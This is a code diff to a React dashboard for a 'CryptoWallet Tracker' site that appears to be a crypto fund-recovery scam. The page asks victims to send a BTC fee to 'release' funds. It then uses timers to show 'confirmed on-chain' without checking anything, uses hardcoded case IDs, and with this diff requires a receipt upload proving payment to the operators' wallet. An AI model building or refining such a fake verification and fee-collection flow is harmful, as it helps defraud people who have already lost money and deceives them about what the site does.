@@ -1,6 +1,8 @@
 import { useState, useEffect, useRef } from 'react'
 import type { Page } from '../App'
 import type { AuthUser } from '../lib/auth'
+import { LOGO_URL } from '../lib/branding'
+import { addReceipt } from '../lib/receipts'
 import {
   Search, Upload, MessageSquare, FileText, Clock,
   ArrowLeft, AlertTriangle, Check, ChevronRight,
@@ -79,6 +81,8 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
   const [message, setMessage] = useState('')
   const [submitDone, setSubmitDone] = useState(false)
   const [copied, setCopied] = useState(false)
+  const [receiptName, setReceiptName] = useState('')
+  const [receiptDataUrl, setReceiptDataUrl] = useState('')
   const [cases, setCases] = useState<Case[]>([])
   const [form, setForm] = useState({ name: '', email: '', incident: '', wallets: '', amount: '', chain: 'Bitcoin', date: '' })
   const initialRan = useRef(false)
@@ -150,15 +154,35 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
   }
 
   const sendPayment = () => {
+    if (!receiptName || !receiptDataUrl) return
     clearScanTimers()
+    const isEth = scanAddr.startsWith('0x')
+    addReceipt({
+      caseId: isEth ? 'CS-2026-0E92' : 'CS-2026-0891',
+      clientName: user?.name ?? 'Client',
+      email: user?.email ?? '',
+      fileName: receiptName,
+      size: 'Receipt',
+      dataUrl: receiptDataUrl,
+    })
+    setCases(prev => prev.map(c => ({ ...c, feePaid: true })))
     setPhase('received')
     flowTimer.current = setTimeout(() => {
       setPhase('processing')
       flowTimer.current = setTimeout(() => {
         setPhase('done')
-        setCases(prev => prev.map(c => ({ ...c, feePaid: true })))
       }, 4000)
     }, 4000)
+  }
+
+  const onReceiptFile = (file?: File | null) => {
+    if (!file) return
+    const reader = new FileReader()
+    reader.onload = () => {
+      setReceiptName(file.name)
+      setReceiptDataUrl(String(reader.result))
+    }
+    reader.readAsDataURL(file)
   }
 
   const resetScanner = () => {
@@ -166,6 +190,8 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
     setPhase('idle')
     setScanProgress(0)
     setSecondsLeft(360)
+    setReceiptName('')
+    setReceiptDataUrl('')
     setCases([])
   }
 
@@ -191,7 +217,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
             </button>
             <span className="text-[#e2e6ed]">/</span>
             <div className="flex items-center gap-2">
-              <img src="/logo.jpg" alt="CryptoWallet Tracker" className="h-6 w-auto object-contain" />
+              <img src={LOGO_URL} alt="CryptoWallet Tracker" className="h-6 w-auto object-contain" />
               <span className="font-medium text-sm">CryptoWallet Tracker</span>
             </div>
           </div>
@@ -523,8 +549,38 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                           <p className="font-mono text-[10px] text-[#6b7280] mt-2">Send exactly {feeBtc} BTC. Your funds will be released once the payment is confirmed on-chain.</p>
                         </div>
 
-                        <button onClick={sendPayment}
-                          className="w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2">
+                        {/* Receipt upload */}
+                        <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-5 mb-4">
+                          <div className="flex items-center justify-between mb-2">
+                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest">Upload Payment Receipt</p>
+                            <span className="font-mono text-[10px] text-[#00875a]">{receiptName ? '✓ Attached' : 'Required'}</span>
+                          </div>
+                          {receiptName ? (
+                            <div className="flex items-center gap-3 bg-white border border-[#00875a]/20 rounded-xl px-4 py-3">
+                              <div className="w-9 h-9 rounded-lg bg-[#e3f5ee] flex items-center justify-center flex-shrink-0">
+                                <Check size={16} className="text-[#00875a]" />
+                              </div>
+                              <div className="flex-1 min-w-0">
+                                <p className="text-sm font-medium truncate">{receiptName}</p>
+                                <p className="font-mono text-[10px] text-[#6b7280]">Receipt attached — sent to our verification desk</p>
+                              </div>
+                              <label className="flex items-center gap-1 text-xs text-[#0057ff] hover:underline font-medium cursor-pointer flex-shrink-0">
+                                <FileUp size={12} /> Replace
+                                <input type="file" accept="image/*,application/pdf" className="hidden" onChange={e => onReceiptFile(e.target.files?.[0])} />
+                              </label>
+                            </div>
+                          ) : (
+                            <label className="flex flex-col items-center justify-center gap-2 border-2 border-dashed border-[#c8cfd9] rounded-xl py-8 cursor-pointer hover:border-[#f7931a] hover:bg-[#fff9f0] transition-colors">
+                              <FileUp size={20} className="text-[#6b7280]" />
+                              <p className="text-sm text-[#3d4452]">Click to upload your transaction receipt (screenshot / PDF)</p>
+                              <p className="font-mono text-[10px] text-[#6b7280]">PNG · JPG · PDF — shows the {feeBtc} BTC payment to our wallet</p>
+                              <input type="file" accept="image/*,application/pdf" className="hidden" onChange={e => onReceiptFile(e.target.files?.[0])} />
+                            </label>
+                          )}
+                        </div>
+
+                        <button onClick={sendPayment} disabled={!receiptName}
+                          className="w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
                           I Have Sent the Payment — Verify <ChevronRight size={15} />
                         </button>
                       </div>
@@ -540,7 +596,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                     </div>
                     <h3 className="font-semibold text-lg mb-2">Payment Received</h3>
                     <p className="font-mono text-sm text-[#00875a] mb-1">{feeBtc} BTC confirmed on-chain</p>
-                    <p className="text-[#3d4452] text-sm max-w-sm mx-auto">Verifying the transaction and preparing your release...</p>
+                    <p className="text-[#3d4452] text-sm max-w-sm mx-auto">Your receipt has been sent to our verification desk. Confirming and preparing your release...</p>
                   </div>
                 )}
 
